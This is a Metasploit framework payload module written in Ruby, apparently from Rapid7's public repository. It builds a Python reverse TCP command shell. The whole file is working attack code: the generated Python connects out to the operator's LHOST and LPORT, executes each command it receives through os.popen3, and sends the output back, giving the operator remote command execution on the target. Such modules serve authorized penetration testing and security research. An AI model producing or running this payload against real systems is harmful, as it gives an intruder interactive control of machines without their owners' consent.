##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/python'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse TCP (via python)',
      'Description'   => 'Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3',
      'Author'        => 'Ben Campbell', # Based on RageLtMan's reverse_ssl
      'License'       => MSF_LICENSE,
      'Platform'      => %w{ linux osx python unix win },
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(2)
    # Set up the socket
    cmd << "import socket,os\n"
    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd << "so.connect(('#{datastore['LHOST']}',#{ datastore['LPORT']}))\n"
    # The actual IO
    cmd << "#{dead}=False\n"
    cmd << "while not #{dead}:\n"
    cmd << "\tdata=so.recv(1024)\n"
    cmd << "\tif len(data)==0:\n\t\t#{dead}=True\n"
    cmd << "\tstdin,stdout,stderr,=os.popen3(data)\n"
    cmd << "\tstdout_value=stdout.read()+stderr.read()\n"
    cmd << "\tso.send(stdout_value)\n"

    flatten(cmd)
  end
end
